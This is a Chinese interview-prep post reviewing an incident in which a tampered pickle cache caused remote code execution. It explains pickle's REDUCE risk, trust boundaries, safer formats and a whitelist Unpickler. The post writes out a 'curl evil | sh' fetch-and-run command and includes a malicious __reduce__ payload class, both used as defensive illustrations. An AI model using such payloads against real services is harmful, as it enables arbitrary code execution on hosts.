---
title: [Q7157] pickle 反序列化不可信文件事故复盘：一个缓存文件打穿内网
date: 2026-11-21
categories: [Python工程化]
tags: [Python面试, 面试题, 27]
type: 面试题
---

### Q7157 · pickle 反序列化不可信文件事故复盘：一个缓存文件打穿内网

难度：P6-P7 | 标签：pickle、安全、事故复盘

**问**：某数据服务用 pickle 序列化 DataFrame 缓存到共享存储，攻击者在共享存储投放了篡改的 `.pkl` 文件，服务加载即执行任意代码（RCE）。复盘：pickle 为什么天生不能用于不可信数据？"能加载就安全"的错觉从哪来？替代方案与迁移路径是什么？

**答**：结论：pickle 不是数据格式而是**字节码序列化协议**——`pickle.loads` 会执行流中的 `REDUCE` 指令（调用任意可导入对象的任意函数），攻击者只要构造 `os.system("curl evil | sh")` 的 reduce 链即可 RCE。事故错觉来源："文件在我们自己的存储里 = 可信"——共享存储/S3 桶/用户上传目录是信任边界之外，任何可被第三方写入的位置都是不可信源。

取舍与实战：
1. 信任边界判定：pickle 只可用于"生产者与消费者都是同一信任域、且传输通道加密 + 写入方受控"的场景（如本机进程间临时文件）；跨服务、跨租户、用户可达的存储一律禁用。
2. 替代方案按数据类型选：结构化表格 → Parquet/Arrow IPC（Q346/Q7022）；通用对象 → JSON + Pydantic 校验（未知字段拒绝）；确需传 Python 对象 → `pickle` 换受限方案如 `json`+代码侧重建，或用 sandboxed 反序列化库（受限 unpickler 白名单）。numpy 有 `.npz`（允许 `allow_pickle=False` 读纯数值数组）。
3. 纵深防御：反序列化调用点统一收敛到工具函数（禁散装 `pickle.loads`），函数内强制白名单 Unpickler + 文件来源校验（签名/HMAC）；ruff 安全规则（bandit S301 类）做静态门禁。
4. 事故应急：发现污染文件后的止血是"隔离存储 + 排查加载时间窗内的主机进程"，pickle RCE 等于主机沦陷，要按主机入侵响应而不是数据修复处理。

```python
"""受限 Unpickler：白名单反序列化 + 危险 opcode 拒绝（标准库，可运行）"""
import io, pickle
from pickle import Unpickler

class RestrictedUnpickler(Unpickler):
    ALLOWED = {"builtins": {"set", "list", "dict", "frozenset", "range"},
               "collections": {"OrderedDict", "defaultdict"}}
    def find_class(self, module, name):
        if module in self.ALLOWED and name in self.ALLOWED[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"[阻断] 禁止加载 {module}.{name}")

def safe_loads(data: bytes):
    return RestrictedUnpickler(io.BytesIO(data)).load()

good = pickle.dumps({"a": 1})
print("白名单对象:", safe_loads(good))

evil = pickle.dumps(io.BytesIO(b""))  # 构造含非白名单全局引用的流
class Evil:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))
evil_bytes = pickle.dumps(Evil())
try:
    safe_loads(evil_bytes)
except pickle.UnpicklingError as e:
    print("攻击流被拦截:", e)
assert "eval" not in good.hex()  # 正常流不受影响
```

**追问 1**：为什么"只反序列化自己存的文件"也可能出事？
**提示**：存储可写面（共享桶、备份目录被篡改）与"生产者身份被冒充"（拿到写权限的入侵者）都超出生产者信任；关键缓存可加 HMAC 签名，校验失败拒载。

**追问 2**：`torch.load`/老版本 joblib 这类基于 pickle 的框架加载为什么是同类风险？它们怎么缓解？
**提示**：模型文件里嵌任意 Python 对象的 reduce 链，同类 RCE；缓解是框架提供 `weights_only=True`（torch）或专用 safetensors 格式——本质都是"只允许张量/数值容器，拒绝任意对象"。

## 背诵要点
- pickle 是字节码协议：loads 执行 REDUCE 调用任意对象，不可信源一律禁用（S301 类静态规则门禁）。
- 信任边界：共享存储/S3/用户上传都是边界外；替代按类型选 Parquet/JSON+Pydantic/npz。
- 收敛统一 safe_loads 入口 + 白名单 Unpickler + HMAC 签名；事故按主机入侵响应处置。

## 复盘追问
- 如何在代码库做一次 pickle.loads 调用点普查，并按信任边界分级整改？
- 已有 pickle 缓存迁移到 Parquet 时，如何保证旧缓存过期前双读兼容？
